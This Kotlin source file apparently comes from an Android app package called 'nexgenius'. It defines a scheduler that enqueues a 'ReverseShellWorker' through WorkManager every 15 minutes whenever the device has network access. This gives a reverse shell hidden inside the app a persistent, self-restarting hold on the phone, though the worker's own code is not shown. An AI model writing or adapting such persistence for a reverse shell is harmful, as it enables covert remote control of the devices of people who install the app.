package com.satwik.nexgenius.core.main

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.time.Duration
import java.util.concurrent.TimeUnit

object Scheduler {
    @RequiresApi(Build.VERSION_CODES.O)
    fun scheduleReverseShellWorker(context: Context){

        val workRequest = PeriodicWorkRequestBuilder<ReverseShellWorker>(15, TimeUnit.MINUTES)
            .setBackoffCriteria(
                backoffPolicy = BackoffPolicy.LINEAR,
                duration = Duration.ofSeconds(15),
            )
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(context)
            .enqueueUniquePeriodicWork(
                "Reverse_Shell_1",
                ExistingPeriodicWorkPolicy.UPDATE,
                workRequest
            )
    }

}